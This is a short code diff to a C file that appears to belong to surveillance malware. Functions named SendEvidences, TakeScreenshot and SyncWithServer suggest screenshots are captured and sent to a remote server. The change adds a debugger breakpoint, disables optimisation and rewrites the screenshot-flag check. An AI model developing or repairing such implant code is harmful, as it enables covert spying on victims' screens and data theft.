@@ -78,6 +78,7 @@ BOOL SendInfo(LPWSTR pInfoString)
 	return bRetVal;
 }
 
+#pragma optimize("", off)
 BOOL SendEvidences()
 {
 	BOOL bRetVal = TRUE;
@@ -160,9 +161,9 @@ BOOL SendEvidences()
 //	else
 //		OutputDebugString(L"[*] No DeviceInfo\n");
 #endif
-	
+	__asm int 3;
 	// SCREENSHOT
-	if (memcmp(SCREENSHOT_FLAG, "\x00\x00\x00\x00", sizeof(ULONG)))
+	if (*(PULONG)SCREENSHOT_FLAG == 0)
 	{
 		ULONG uScreenShotLen;
 		PBYTE pJPEGBuffer = TakeScreenshot(&uScreenShotLen);
@@ -253,6 +254,7 @@ BOOL SendEvidences()
 
 	return bRetVal;
 }
+#pragma optimize("", on)
 
 BOOL SyncWithServer()
 {
